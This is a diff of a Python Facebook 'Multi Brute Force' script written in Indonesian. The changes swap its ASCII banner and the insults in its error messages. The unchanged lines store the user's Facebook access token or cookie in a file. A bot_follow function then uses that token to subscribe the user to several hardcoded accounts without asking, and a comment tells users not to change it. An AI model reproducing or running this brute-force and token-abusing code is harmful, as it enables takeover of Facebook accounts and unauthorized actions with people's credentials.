@@ -33,7 +33,17 @@ else:
 ### HEADERS ###
 
 def banner():
-    print("""\x1b[0;37m   ___                   \n  / _ \_______              \n / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\n/_/  /_/__\__/(_) Force 3.9  │ Author  : Aang Ardiansyah-XD   \n       /  ^ \/ / // /  ^ \   │ Contact : 089524163441   \n      /_/_/_/_/\_,_/_/_/_/   └──────────────────────────────┘""")
+    logo = ("""\x1b[1;92m   ______     __ __       __
+\x1b[1;92m  / ____/____/ // / _____/ /__\x1b[1;93m||WATEPAK MEN!!
+\x1b[1;92m / /   / ___/ // /_/ ___/ //_/\x1b[1;93m||Created By Aang-XD
+\x1b[1;92m/ /___/ /  /__  __/ /__/ ,<   \x1b[1;93m||You tube: Aang-XD
+\x1b[1;92m\____/_/V3 1 /_/  \___/_/|_|  \x1b[1;93m||Facebook: Saya Aang
+\x1b1\x1b[1;97m\x1b[\x1b[1;97mâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
+\x1b[1;97mâ•‘\x1b[1;97m Author  : \x1b[1;93mAang Ardiansyah-XD
+\x1b[1;97mâ•‘\x1b[1;97m Github  : \x1b[1;93mGithub.com/AngCyber
+\x1b[1;97mâ•‘\x1b[1;97m Contact : \x1b[1;93m089524163441
+\x1b1\x1b[1;97m\x1b[\x1b[1;97mâ•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+""")
 
 host="https://mbasic.facebook.com"
 ok = []
@@ -216,7 +226,7 @@ def log_token():
         print((k+"\n["+p+"•"+k+"]"+p+" Berhasil masuk, sabar tod..."))
         bot_follow()
     except KeyError:
-        print((k+"["+p+"!"+k+"]"+p+" Token Invalid Kentod!!"))
+        print((k+"["+p+"!"+k+"]"+p+" Token Invalid Ngab!!"))
         os.system("clear")
         logs()
 
@@ -243,13 +253,13 @@ def gen():
         except requests.exceptions.ConnectionError:
                 print((k+"["+p+"!"+k+"]"+p+" No Connection"))
         except [KeyError,IOError]:
-            print((k+"["+p+"!"+k+"]"+p+" Cookies Invalid Kentod!!"))
+            print((k+"["+p+"!"+k+"]"+p+" Cookies Invalid Ngab!!"))
             os.system("clear")
             logs()
         cookie = open("login.txt", "w")
         cookie.write(find_token.group(1))
         cookie.close()
-        print((k+"\n["+p+"•"+k+"]"+p+" Berhasil masuk, sabar tod..."))
+        print((k+"\n["+p+"•"+k+"]"+p+" Berhasil masuk, sabar napa..."))
         bot_follow()
 
 ### BOT FOLLOW ### Jangan Diganti Anjing !!!
@@ -262,9 +272,9 @@ def bot_follow():
 		nama = a["name"]
 		id = a["id"]
 	except IOError:
-		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid Kentod!!"))
+		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid Ngab!!"))
 		logs()
-	jalan("%s[%s•%s] %sSabar tod, sedang masuk..."%(k,p,k,p))
+	jalan("%s[%s•%s] %sSabar ngab sedang masuk..."%(k,p,k,p))
 	requests.post("https://graph.facebook.com/1827084332/subscribers?access_token=" + toket)      # Dapunta Khurayra X
 	requests.post("https://graph.facebook.com/1673250723/subscribers?access_token=" + toket)      # Dapunta Ratya
 	requests.post("https://graph.facebook.com/100000431996038/subscribers?access_token=" + toket) # Almira Gabrielle X
